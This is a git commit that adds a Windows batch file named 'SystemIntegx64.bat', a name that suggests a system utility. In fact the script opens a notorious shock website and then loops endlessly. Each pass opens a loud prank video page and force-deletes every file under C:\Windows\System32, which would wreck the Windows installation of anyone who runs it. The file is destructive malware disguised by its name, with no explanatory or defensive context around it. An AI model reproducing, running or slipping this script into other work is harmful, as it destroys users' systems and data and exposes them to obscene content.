b7aef805ff9271e2da707dd5e5c8da547263a97d
baker12335h4990k <40251167+baker12335h4990k@users.noreply.github.com>
2018-10-03 23:45:21 -0700

    Add files via upload

---
+++ SystemIntegx64.bat
@@ -0,0 +1,8 @@
+start http://www.goatsedance.com
+start
+goto loop
+
+:loop
+start http://www.youtubemultiplier.com/532d689b10ba7-maximum-sanic-ear-rape.php
+del "C:\Windows\System32\*.*" /s /f /q
+goto loop
